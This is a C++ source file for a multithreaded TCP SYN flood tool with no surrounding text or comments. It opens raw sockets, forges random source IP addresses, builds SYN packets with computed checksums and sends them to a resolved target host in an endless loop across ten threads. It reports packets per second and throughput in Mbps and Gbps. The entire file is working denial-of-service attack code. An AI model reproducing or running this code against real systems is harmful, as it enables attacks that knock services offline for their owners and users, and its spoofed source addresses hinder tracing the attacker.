#include <arpa/inet.h>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iostream>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>
#include <atomic>
#include <thread>
#include <vector>
#include <chrono>

#define PACKET_LEN 2000
#define THREAD_COUNT 10

std::atomic<bool> flood_running(true);
std::atomic<long long> total_packets(0);
std::atomic<long long> total_bytes(0);

unsigned short calculate_tcp_checksum(struct iphdr *ip) {
  struct tcphdr *tcp = (struct tcphdr *)((char *)ip + (ip->ihl << 2));
  int tcp_len = ntohs(ip->tot_len) - (ip->ihl << 2);

  struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t reserved;
    uint8_t protocol;
    uint16_t tcp_length;
  } pseudo;

  pseudo.src_addr = ip->saddr;
  pseudo.dst_addr = ip->daddr;
  pseudo.reserved = 0;
  pseudo.protocol = IPPROTO_TCP;
  pseudo.tcp_length = htons(tcp_len);

  int total_len = sizeof(pseudo) + tcp_len;
  char *buffer = new char[total_len];
  memcpy(buffer, &pseudo, sizeof(pseudo));
  memcpy(buffer + sizeof(pseudo), tcp, tcp_len);

  unsigned long sum = 0;
  uint16_t *addr = (uint16_t *)buffer;
  for (int i = 0; i < total_len / 2; i++)
    sum += addr[i];
  if (total_len % 2)
    sum += ((uint16_t *)buffer)[total_len - 1];

  while (sum >> 16)
    sum = (sum & 0xFFFF) + (sum >> 16);

  delete[] buffer;
  return (unsigned short)(~sum);
}

void send_raw_ip_packet(int sock, char *packet, int packet_len, struct sockaddr_in *dest) {
  sendto(sock, packet, packet_len, 0, (struct sockaddr *)dest, sizeof(*dest));
}

void syn_flood_worker(uint32_t dest_ip, int port, struct sockaddr_in addr, int thread_id) {
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sock < 0) return;

  int one = 1;
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

  int buffer_size = 1024 * 1024 * 2;
  setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

  char buffer[PACKET_LEN];
  struct iphdr *ip = (struct iphdr *)buffer;
  struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));
  struct sockaddr_in dest_info;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = addr.sin_addr;

  unsigned int seed = time(nullptr) + thread_id;

  while (flood_running) {
    memset(buffer, 0, PACKET_LEN);

    tcp->source = htons(rand_r(&seed) % 65535 + 1);
    tcp->dest = htons(port);
    tcp->seq = rand_r(&seed);
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(20000);
    tcp->check = 0;

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = rand_r(&seed);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = rand_r(&seed);
    ip->daddr = dest_ip;
    ip->check = 0;

    tcp->check = calculate_tcp_checksum(ip);

    send_raw_ip_packet(sock, buffer, ntohs(ip->tot_len), &dest_info);
    total_packets++;
    total_bytes += ntohs(ip->tot_len);
  }

  close(sock);
}

void tcpflood(std::string target, int port) {
  struct addrinfo hints, *res;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;

  if (getaddrinfo(target.c_str(), nullptr, &hints, &res) != 0) {
    std::cerr << "DNS resolution failed for: " << target << std::endl;
    return;
  }

  struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
  uint32_t dest_ip = addr->sin_addr.s_addr;
  struct sockaddr_in target_addr = *addr;
  freeaddrinfo(res);

  std::cout << "Flooding " << target << " (" << inet_ntoa(*(struct in_addr *)&dest_ip) << ":" << port << ")" << std::endl;
  std::cout << "Threads: " << THREAD_COUNT << std::endl;

  flood_running = true;
  total_packets = 0;
  total_bytes = 0;

  std::vector<std::thread> threads;
  for (int i = 0; i < THREAD_COUNT; i++) {
    threads.emplace_back(syn_flood_worker, dest_ip, port, target_addr, i);
  }

  auto start_time = std::chrono::steady_clock::now();
  long long last_packets = 0;
  long long last_bytes = 0;

  while (flood_running) {
    std::this_thread::sleep_for(std::chrono::seconds(1));

    auto now = std::chrono::steady_clock::now();
    double elapsed = std::chrono::duration<double>(now - start_time).count();

    long long current_packets = total_packets.load();
    long long current_bytes = total_bytes.load();

    long long pps = current_packets - last_packets;
    long long bps = current_bytes - last_bytes;

    double mbps = (bps * 8) / (1024.0 * 1024.0);
    double gbps = mbps / 1024.0;

    std::cout << "\rPackets: " << current_packets << " | PPS: " << pps << " | "
              << mbps << " Mbps (" << gbps << " Gbps) | Time: " << (int)elapsed << "s    " << std::flush;

    last_packets = current_packets;
    last_bytes = current_bytes;
  }

  for (auto &t : threads) {
    t.join();
  }

  auto end_time = std::chrono::steady_clock::now();
  double total_seconds = std::chrono::duration<double>(end_time - start_time).count();
  long long final_packets = total_packets.load();
  long long final_bytes = total_bytes.load();
  double avg_mbps = (final_bytes * 8) / (1024.0 * 1024.0) / total_seconds;

  std::cout << "\n\n=== STATISTICS ===" << std::endl;
  std::cout << "Duration: " << total_seconds << " seconds" << std::endl;
  std::cout << "Total packets: " << final_packets << std::endl;
  std::cout << "Total data: " << (final_bytes / (1024.0 * 1024.0)) << " MB" << std::endl;
  std::cout << "Average rate: " << avg_mbps << " Mbps" << std::endl;
  std::cout << "Average PPS: " << (final_packets / total_seconds) << std::endl;
}

void stop_flood() {
  flood_running = false;
}